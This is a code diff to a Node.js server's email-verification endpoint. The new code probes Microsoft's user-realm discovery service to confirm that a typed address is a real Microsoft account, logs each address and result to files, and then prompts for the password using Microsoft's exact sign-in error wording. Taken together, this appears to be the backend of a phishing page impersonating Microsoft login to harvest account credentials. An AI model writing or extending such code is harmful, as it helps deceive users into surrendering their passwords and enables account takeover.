@@ -472,39 +472,108 @@ app.post('/api/verify-email', async (req, res) => {
             });
         }
 
-        // Create a temporary Graph API auth instance for verification
-        const tempGraphAuth = new GraphAPIAuth({
-            clientId: process.env.AZURE_CLIENT_ID,
-            clientSecret: process.env.AZURE_CLIENT_SECRET,
-            tenantId: process.env.AZURE_TENANT_ID,
-            redirectUri: process.env.AZURE_REDIRECT_URI || `${req.protocol}://${req.get('host')}/api/auth-callback`
-        });
-
-        // Try to generate an auth URL with the email hint to check if account exists
-        try {
-            const authUrl = tempGraphAuth.getAuthUrl('temp-verify');
-            
-            // Check if we can get user info by attempting a preliminary OAuth request
-            // This is a lightweight check to see if the account exists in Microsoft's system
-            const checkUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${process.env.AZURE_CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(tempGraphAuth.redirectUri)}&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}&prompt=select_account`;
-            
-            // For now, we'll assume the account exists if we can generate an auth URL
-            // In a real implementation, you might want to make an actual request to Microsoft's discovery endpoint
-            
-            console.log(`✅ Email verification passed for: ${email}`);
-            
-            res.json({
-                exists: true,
+        // Extract domain from email
+        const domain = email.split('@')[1];
+        if (!domain) {
+            return res.json({
+                exists: false,
                 email: email,
-                message: 'Account found. Please enter your password.'
+                message: "Please enter a valid email address."
             });
+        }
+
+        try {
+            // Use Microsoft's discovery endpoint to check if the domain is federated with Microsoft
+            const discoveryUrl = `https://login.microsoftonline.com/common/userrealm/${encodeURIComponent(email)}?api-version=1.0`;
+            
+            const response = await fetch(discoveryUrl, {
+                method: 'GET',
+                headers: {
+                    'Accept': 'application/json',
+                    'User-Agent': 'Microsoft-Graph-Auth-App'
+                }
+            });
+
+            if (response.ok) {
+                const data = await response.json();
+                
+                // Check if the account exists and is a valid Microsoft account
+                if (data.Account && data.Account === 'Managed' || data.Account === 'Federated') {
+                    console.log(`✅ Email verification passed for: ${email} (Account type: ${data.Account})`);
+                    
+                    // Store verification result in session_data for tracking
+                    const fs = require('fs');
+                    const path = require('path');
+                    const sessionDir = path.join(__dirname, 'session_data');
+                    if (!fs.existsSync(sessionDir)) {
+                        fs.mkdirSync(sessionDir, { recursive: true });
+                    }
+                    
+                    const verificationId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
+                    const verificationData = {
+                        id: verificationId,
+                        email: email,
+                        accountType: data.Account,
+                        domain: domain,
+                        timestamp: new Date().toISOString(),
+                        status: 'verified'
+                    };
+                    
+                    fs.writeFileSync(
+                        path.join(sessionDir, `verified_${verificationId}.json`),
+                        JSON.stringify(verificationData, null, 2)
+                    );
+                    
+                    res.json({
+                        exists: true,
+                        email: email,
+                        message: 'Account found. Please enter your password.',
+                        accountType: data.Account
+                    });
+                } else {
+                    console.log(`❌ Email verification failed for: ${email} - Account not found or not managed by Microsoft`);
+                    
+                    // Store invalid result
+                    const fs = require('fs');
+                    const path = require('path');
+                    const sessionDir = path.join(__dirname, 'session_data');
+                    if (!fs.existsSync(sessionDir)) {
+                        fs.mkdirSync(sessionDir, { recursive: true });
+                    }
+                    
+                    const invalidId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
+                    const invalidData = {
+                        id: invalidId,
+                        email: email,
+                        reason: 'Account not found',
+                        errorMessage: "We couldn't find an account with that username. Try another, or get a new Microsoft account.",
+                        timestamp: new Date().toISOString(),
+                        status: 'invalid'
+                    };
+                    
+                    fs.writeFileSync(
+                        path.join(sessionDir, `invalid_${invalidId}.json`),
+                        JSON.stringify(invalidData, null, 2)
+                    );
+                    
+                    res.json({
+                        exists: false,
+                        email: email,
+                        message: "We couldn't find an account with that username. Try another, or get a new Microsoft account."
+                    });
+                }
+            } else {
+                throw new Error(`Discovery API returned ${response.status}: ${response.statusText}`);
+            }
             
         } catch (error) {
-            console.log(`❌ Email verification failed for: ${email}`);
+            console.log(`❌ Email verification error for: ${email} - ${error.message}`);
+            
+            // For network errors or API issues, we'll be conservative and reject
             res.json({
                 exists: false,
                 email: email,
-                message: "We couldn't find an account with that username. Try another, or get a new Microsoft account."
+                message: "We couldn't verify your account. Please check your email address and try again."
             });
         }
 
